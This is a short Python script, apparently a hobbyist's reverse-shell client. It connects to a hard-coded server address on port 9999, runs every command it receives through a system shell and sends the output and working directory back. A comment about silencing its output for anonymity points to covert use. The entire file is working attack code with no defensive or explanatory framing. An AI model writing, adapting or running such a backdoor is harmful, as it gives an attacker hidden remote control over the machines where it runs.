# -*- coding: utf-8 -*-
"""
Created on Tue May  7 15:25:20 2019

@author: nahid
"""

import socket
import os
import subprocess

s = socket.socket()
host = "192.168.43.186" #ip of the server 192.168.43.186
port = 9999

s.connect((host,port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))
        
    if len(data) > 0 :
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        currentWD = os.getcwd() +">"
        s.send(str.encode(output_str + currentWD))
        #for anonymously thils prin t is not necessary
        print(output_str)